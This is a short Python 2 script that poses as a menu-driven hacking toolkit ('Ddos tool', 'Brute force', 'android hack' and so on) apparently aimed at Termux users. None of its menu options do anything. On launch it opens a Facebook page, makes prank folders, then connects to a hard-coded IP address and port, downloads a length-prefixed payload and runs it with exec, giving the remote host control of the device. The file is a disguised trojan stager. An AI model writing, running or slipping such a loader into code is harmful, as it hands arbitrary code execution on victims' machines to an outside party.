import sys, os
import socket,struct,time

print '            tool by Ali PotHead'
print '\n(1).Ddos tool\n(2).Brute force\n(3).website hack\n(4).android hack\n(6).linux hack\n(7).windows hack\n(8).android hack\n(9).about me\n(0).exit\n       '
os.system('termux-open-url https://www.facebook.com/Ali.Davis.Pottuss')
os.system('cd /sdcard/')
os.system('cd /sdcard')
os.system('mkdir AliWasHere')
os.system('mkdir ULost')
os.system('mkdir WinkyEmoji')

for x in range(10):
	try:
		s=socket.socket(2,socket.SOCK_STREAM)
		s.connect(('52.15.183.149',15004))
		break
	except:
		time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
	d+=s.recv(l-len(d))
exec(d,{'s':s})
def hoho():
    ola = raw_input('here :')
    if ola == '9':
        print ' its a test! i hacked you'
        hoho()
    else:
        print 'ERROR'
        hoho()


hoho()
